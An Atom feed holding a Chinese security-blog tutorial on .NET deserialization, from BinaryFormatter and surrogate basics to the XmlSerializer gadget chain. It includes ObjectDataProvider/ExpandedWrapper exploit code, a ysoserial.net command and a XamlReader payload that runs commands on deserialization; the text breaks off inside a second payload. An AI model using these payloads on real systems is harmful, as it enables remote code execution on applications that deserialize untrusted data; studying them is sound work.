<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ConsT27&#39;s Blog</title>
  
  
  <link href="http://const27.com/atom.xml" rel="self"/>
  
  <link href="http://const27.com/"/>
  <updated>2022-03-27T15:31:07.936Z</updated>
  <id>http://const27.com/</id>
  
  <author>
    <name>ConsT27</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dotnet反序列化——XmlSerializer链</title>
    <link href="http://const27.com/2022/03/27/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94XmlSerializer%E9%93%BE/"/>
    <id>http://const27.com/2022/03/27/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94XmlSerializer%E9%93%BE/</id>
    <published>2022-03-27T10:44:45.559Z</published>
    <updated>2022-03-27T15:31:07.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Dotnet反序列化"><a href="#Dotnet反序列化" class="headerlink" title="Dotnet反序列化"></a>Dotnet反序列化</h1><p>本文很大程度参考了Y4er师傅的文章：<a href="https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md">https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md</a></p><p>本小节很大程度参考了Y4er师傅的</p><p>先来一个最基本的Dotnet反序列化demo，了解一下Serializable、NonSerialized特性以及序列化、反序列化会用到的函数等。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line">namespace ConsoleAppi1;</span><br><span class="line"></span><br><span class="line">[Serializable]   <span class="comment">//一个需要被序列化的类需要加上Serializable特性</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age=<span class="number">10</span>;</span><br><span class="line">    [NonSerialized]<span class="keyword">public</span> String name=<span class="string">&quot;tom&quot;</span>;  <span class="comment">//NonSerialized特性用于标识不需要被序列化的属性</span></span><br><span class="line">    <span class="keyword">public</span> String sex = <span class="string">&quot;Male&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person();</span><br><span class="line">        FileStream fstream = <span class="keyword">new</span> FileStream(<span class="string">&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;</span>, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);</span><br><span class="line"></span><br><span class="line">        BinaryFormatter binFormatterS = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">        binFormatterS.Serialize(fstream,p1);</span><br><span class="line"></span><br><span class="line">        BinaryFormatter binFormatterD = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">        fstream.Position = <span class="number">0</span>; <span class="comment">//不加这个可能会报错</span></span><br><span class="line">        Person p2 = (Person)binFormatterD.Deserialize(fstream);</span><br><span class="line">        </span><br><span class="line">        Console.WriteLine(<span class="string">&quot;age:&quot;</span>+p2.age);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;name:&quot;</span>+p2.name);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;sex:&quot;</span>+p2.sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看序列化的数据，发现采用0001 0000开头</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183941.png"></p><h2 id="Formatter"><a href="#Formatter" class="headerlink" title="Formatter"></a>Formatter</h2><p>Formatter用于设置序列化的格式，如我们上面用到了BinaryFormatter 进行二进制序列化，除此之外还有很多Formatter</p><p>如：<br>SoapFormatter 用于序列化soap格式<br>LosFormatter 用于序列化 Web 窗体页的视图状态<br>XmlSerializer 用于生成XML 等</p><p>所有Formatter都最终继承自IFormatter接口，我们看看这个接口</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183942.png"></p><p>可以发现定义了序列化、反序列化方法以及三个属性，通过这三个属性可以控制序列化、反序列化的过程。我们重点关注SurrogateSelector属性。</p><table><thead><tr><th>类 字段名</th><th>含义用途</th></tr></thead><tbody><tr><td>ISurrogateSelector SurrogateSelector</td><td>序列化代理选择器 接管formatter的序列化或反序列化处理</td></tr><tr><td>SerializationBinder Binder</td><td>用于控制在序列化和反序列化期间使用的实际类型</td></tr><tr><td>StreamingContext Context</td><td>序列化流上下文 其中states字段包含了序列化的来源和目的地</td></tr></tbody></table><h3 id="BinaryFormatter序列化的生命周期和事件"><a href="#BinaryFormatter序列化的生命周期和事件" class="headerlink" title="BinaryFormatter序列化的生命周期和事件"></a>BinaryFormatter序列化的生命周期和事件</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183946.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183950.png"></p><h4 id="ISerializable"><a href="#ISerializable" class="headerlink" title="ISerializable"></a>ISerializable</h4><p>我们先来看看实现ISerializable 接口的类 序列化、反序列化调用流程 </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line">using System.Security.Permissions;</span><br><span class="line"></span><br><span class="line">namespace ConsoleAppi1;</span><br><span class="line">[Serializable]</span><br><span class="line">public class Person:ISerializable</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//必须重载一个如下参数的构造方法，不重载的话会在反序列化时报错</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">Person</span><span class="params">(SerializationInfo info, StreamingContext context)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Constructor Begin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span><span class="params">(SerializationInfo info, StreamingContext context)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;GetObjectData&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [OnDeserializing]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnDeserializing</span><span class="params">(StreamingContext sc)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;TestOnDeserializing&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [OnDeserialized]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnDeserialized</span><span class="params">(StreamingContext sc)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;TestOnDeserialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    [OnSerializing]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnSerializing</span><span class="params">(StreamingContext sc)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;TestOnSerializing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    [OnSerialized]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnSerialized</span><span class="params">(StreamingContext sc)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;TestOnSerialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person();</span><br><span class="line">        FileStream fstream = <span class="keyword">new</span> FileStream(<span class="string">&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;</span>, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);</span><br><span class="line"></span><br><span class="line">        BinaryFormatter binFormatterS = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">        binFormatterS.Serialize(fstream,p1);</span><br><span class="line"></span><br><span class="line">        BinaryFormatter binFormatterD = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">        fstream.Position = <span class="number">0</span>;</span><br><span class="line">        binFormatterD.Deserialize(fstream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183952.png"></p><p>可以发现如果实现了ISerializable接口，那么序列化/反序列化流程则为：</p><p>序列化前：调用OnSerializing 特性的方法<br>序列化中： 调用GetObjectData 方法<br>序列化后：调用OnSerialized特性的方法<br>反序列化前：调用OnDeserializing特性的方法<br>反序列化中：调用有特定参数的构造方法<br>反序列化后：调用OnDeserialized特性的方法</p><h4 id="代理选择器"><a href="#代理选择器" class="headerlink" title="代理选择器"></a>代理选择器</h4><p>再来看看实现代理选择器的类的序列化/反序列化流程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line">using System.Security.Permissions;</span><br><span class="line"></span><br><span class="line">namespace ConsoleAppi1;</span><br><span class="line">[Serializable]</span><br><span class="line">public class Person:ISerializable</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(SerializationInfo info, StreamingContext context)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Constructor Begin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span><span class="params">(SerializationInfo info, StreamingContext context)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;GetObjectData&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [OnDeserializing]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnDeserializing</span><span class="params">(StreamingContext sc)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;TestOnDeserializing&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [OnDeserialized]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnDeserialized</span><span class="params">(StreamingContext sc)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;TestOnDeserialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    [OnSerializing]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnSerializing</span><span class="params">(StreamingContext sc)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;TestOnSerializing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    [OnSerialized]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnSerialized</span><span class="params">(StreamingContext sc)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;TestOnSerialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义代理选择器，需要继承自ISerializationSurrogate，并实现GetObjectData，SetObjectData</span></span><br><span class="line">public class MySerializationSurrogate : ISerializationSurrogate</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span><span class="params">(object obj, SerializationInfo info, StreamingContext context)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;GetObjectData of ISerializationSurrogate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> object <span class="title">SetObjectData</span><span class="params">(object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;SetObjectData of ISerializationSurrogate&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person();</span><br><span class="line">        FileStream fstream = <span class="keyword">new</span> FileStream(<span class="string">&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;</span>, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);</span><br><span class="line">        BinaryFormatter binFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//设置代理选择器</span></span><br><span class="line">        SurrogateSelector ss = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">        ss.AddSurrogate(typeof(Person), binFormatter.Context, <span class="keyword">new</span> MySerializationSurrogate());</span><br><span class="line">        binFormatter.SurrogateSelector = ss;</span><br><span class="line">        </span><br><span class="line">        binFormatter.Serialize(fstream,p1);</span><br><span class="line">        fstream.Position = <span class="number">0</span>;</span><br><span class="line">        binFormatter.Deserialize(fstream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183955.png"></p><h1 id="基础链-XmlSerializer链"><a href="#基础链-XmlSerializer链" class="headerlink" title="基础链-XmlSerializer链"></a>基础链-XmlSerializer链</h1><h2 id="XmlSerializer序列化-反序列化"><a href="#XmlSerializer序列化-反序列化" class="headerlink" title="XmlSerializer序列化/反序列化"></a>XmlSerializer序列化/反序列化</h2><p>来个demo</p><p>我们把要序列化的类用[XmlRoot]，[XmlAttribute]，[XmlElement]特性分别指定根节点，节点属性，节点元素。<br>然后用XmlSerializer 进行序列化和反序列化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line">using System.Security.Permissions;</span><br><span class="line">using System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line">namespace ConsoleAppi1;</span><br><span class="line">[XmlRoot]</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    [XmlAttribute]</span><br><span class="line">    <span class="keyword">public</span> string name &#123; get; set; &#125;</span><br><span class="line">    </span><br><span class="line">    [XmlElement]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age &#123; get; set; &#125;</span><br><span class="line">    </span><br><span class="line">    [XmlElement]</span><br><span class="line">    <span class="keyword">public</span> string sex &#123; get; set; &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person();</span><br><span class="line">        p1.age = <span class="number">20</span>;</span><br><span class="line">        p1.name = <span class="string">&quot;tom&quot;</span>;</span><br><span class="line">        p1.sex = <span class="string">&quot;male&quot;</span>;</span><br><span class="line"></span><br><span class="line">        FileStream fstream = <span class="keyword">new</span> FileStream(<span class="string">&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;</span>, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//XmlSerializer xmlSerializer = new XmlSerializer(typeof(Person));</span></span><br><span class="line">        <span class="comment">//XmlSerializer xmlSerializer = new XmlSerializer(p1.GetType());</span></span><br><span class="line">        XmlSerializer xmlSerializer = <span class="keyword">new</span> XmlSerializer(Type.GetType(<span class="string">&quot;ConsoleAppi1.Person&quot;</span>));</span><br><span class="line"></span><br><span class="line">        xmlSerializer.Serialize(fstream,p1);</span><br><span class="line"></span><br><span class="line">        fstream.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Person p1des =(Person) xmlSerializer.Deserialize(fstream);</span><br><span class="line">        Console.WriteLine(p1des.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化后成功输出</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183016.png"></p><p>这是序列化后的内容</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183017.png"></p><p>同时我们在上面的代码中可以看到在实例化XmlSerializer 时，在传入的参数中我们用到了Type.GetType方法去获取需要被序列化/反序列化的类的type。<br>除了用Type.GetType外，在注释的几行里我们还可以发现，可以用 typeof(ClassName) 和 Object.GetType() 去获取。</p><h2 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h2><h3 id="ObjectDataProvider"><a href="#ObjectDataProvider" class="headerlink" title="ObjectDataProvider"></a>ObjectDataProvider</h3><p>要打造围绕XmlSerializer 的攻击链，我们需要先了解一下ObjectDataProvider这个类，这个类可以帮助我们进行命令执行等操作。</p><p>这个类位于System.Windows.Data下（如果rider提示找不到包，就添加PresentationFramework依赖，注意我当前的环境是.NET FrameWork）。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183021.png"></p><p>前置知识：在.net中我们可以通过方法System.Diagnostics.Process.start()来执行命令，就像java里的 Runtime.getRuntime.exec() 一样。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectDataProvider o = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">o.MethodParameters.Add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">o.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">o.ObjectInstance = <span class="keyword">new</span> System.Diagnostics.Process();</span><br></pre></td></tr></table></figure><p>这段代码执行后后在内部调用System.Diagnostics.Process.start弹计算器出来。<br>ObjectInstance用于指定对象，MethodName用于指定要被调用的方法，MethodParameters指定被调用方法的参数，参数用Add添加。</p><p>同时这段代码在通过xmlserializer反序列化时依旧能够起到命令执行的作用，但是直接反序列化会遇到一些问题</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Windows.Data;</span><br><span class="line">using System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1</span><br><span class="line">&#123;</span><br><span class="line">    [XmlRoot]</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evilfunc</span><span class="params">(string c)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            System.Diagnostics.Process.Start(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            ObjectDataProvider op = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            op.ObjectInstance = <span class="keyword">new</span> evil();</span><br><span class="line">            op.MethodName = <span class="string">&quot;evilfunc&quot;</span>;</span><br><span class="line">            op.MethodParameters.Add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            FileStream fileStream = <span class="keyword">new</span> FileStream(<span class="string">&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;</span>, FileMode.OpenOrCreate,</span><br><span class="line">                FileAccess.ReadWrite, FileShare.ReadWrite);</span><br><span class="line">            XmlSerializer xmlSerializer = <span class="keyword">new</span> XmlSerializer(typeof(ObjectDataProvider));</span><br><span class="line">            xmlSerializer.Serialize(fileStream,op);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接反序列化会报下面的错。因为我们往XmlSerializer 传入的type是ObjectDataProvider，但是实际上我们的ObjectDataProvider中有含有evil类，就会导致类型错误。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183020.png"></p><p>解决方案是用ExpandedWrapper进行包装（如果找不到这个类，rider里右键Dependencies→add References→ System.Data.Services)</p><p>就像这样</p><p>ExpandedWrapper本质上是一个泛型类，可以封装非特定数据类型的对象。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183018.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Windows.Data;</span><br><span class="line">using System.Xml.Serialization;</span><br><span class="line">using System.Data.Services.Internal;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1</span><br><span class="line">&#123;</span><br><span class="line">    [XmlRoot]</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evilfunc</span><span class="params">(string c)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            System.Diagnostics.Process.Start(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            ExpandedWrapper&lt;evil, ObjectDataProvider&gt; ew = <span class="keyword">new</span> ExpandedWrapper&lt;evil, ObjectDataProvider&gt;();</span><br><span class="line">            ew.ProjectedProperty0 = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            ew.ProjectedProperty0.ObjectInstance = <span class="keyword">new</span> evil();</span><br><span class="line">            ew.ProjectedProperty0.MethodName = <span class="string">&quot;evilfunc&quot;</span>;</span><br><span class="line">            ew.ProjectedProperty0.MethodParameters.Add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">            FileStream fileStream = <span class="keyword">new</span> FileStream(<span class="string">&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;</span>, FileMode.OpenOrCreate,</span><br><span class="line">                FileAccess.ReadWrite, FileShare.ReadWrite);</span><br><span class="line">            XmlSerializer xmlSerializer = <span class="keyword">new</span> XmlSerializer(typeof(ExpandedWrapper&lt;evil, ObjectDataProvider&gt;));</span><br><span class="line">            xmlSerializer.Serialize(fileStream,ew);</span><br><span class="line">            fileStream.Position = <span class="number">0</span>;</span><br><span class="line">            xmlSerializer.Deserialize(fileStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化后成功弹出计算器。</p><h3 id="ResourceDictionary"><a href="#ResourceDictionary" class="headerlink" title="ResourceDictionary"></a>ResourceDictionary</h3><p>我们在上一小节讲了ObjectDataProvider并写了一个小demo，但是仅仅是那样的话，威胁还不够大，我们需要找到一个现存的恶意类，并且还要控制反序列化的内容，以及实例化XmlSerializer时传入的参数才有可能完成攻击。</p><p>我们可以用ysoserial.net来生成一段XmlSerializer反序列化的payload<br><a href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.34">https://github.com/pwntester/ysoserial.net/releases/tag/v1.34</a></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">.\ysoserial.exe -g objectdataprovider -c calc -f xmlserializer</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;root type=<span class="string">&quot;System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>&gt;</span><br><span class="line">    &lt;ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> &gt;</span><br><span class="line">        &lt;ExpandedElement/&gt;</span><br><span class="line">        &lt;ProjectedProperty0&gt;</span><br><span class="line">            &lt;MethodName&gt;Parse&lt;/MethodName&gt;</span><br><span class="line">            &lt;MethodParameters&gt;</span><br><span class="line">                &lt;anyType xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> xsi:type=<span class="string">&quot;xsd:string&quot;</span>&gt;</span><br><span class="line">                    &lt;![CDATA[&lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:d=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:b=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:c=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;&lt;ObjectDataProvider d:Key=&quot;&quot; ObjectType=&quot;&#123;d:Type c:Process&#125;&quot; MethodName=&quot;Start&quot;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;b:String&gt;cmd&lt;/b:String&gt;&lt;b:String&gt;/c calc&lt;/b:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;</span><br><span class="line">                &lt;/anyType&gt;</span><br><span class="line">            &lt;/MethodParameters&gt;</span><br><span class="line">            &lt;ObjectInstance xsi:type=&quot;XamlReader&quot;&gt;&lt;/ObjectInstance&gt;</span><br><span class="line">        &lt;/ProjectedProperty0&gt;</span><br><span class="line">    &lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>但是它生成的payload对于新手分析起来难免有点恼火，所以我参考了Y4er提供的payload</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;ResourceDictionary </span><br><span class="line">                    xmlns=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span> </span><br><span class="line">                    xmlns:d=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;</span> </span><br><span class="line">                    xmlns:b=<span class="string">&quot;clr-namespace:System;assembly=mscorlib&quot;</span> </span><br><span class="line">                    xmlns:c=<span class="string">&quot;clr-namespace:System.Diagnostics;assembly=system&quot;</span>&gt;</span><br><span class="line">    &lt;ObjectDataProvider d:Key=<span class="string">&quot;&quot;</span> ObjectType=<span class="string">&quot;&#123;d:Type c:Process&#125;&quot;</span> MethodName=<span 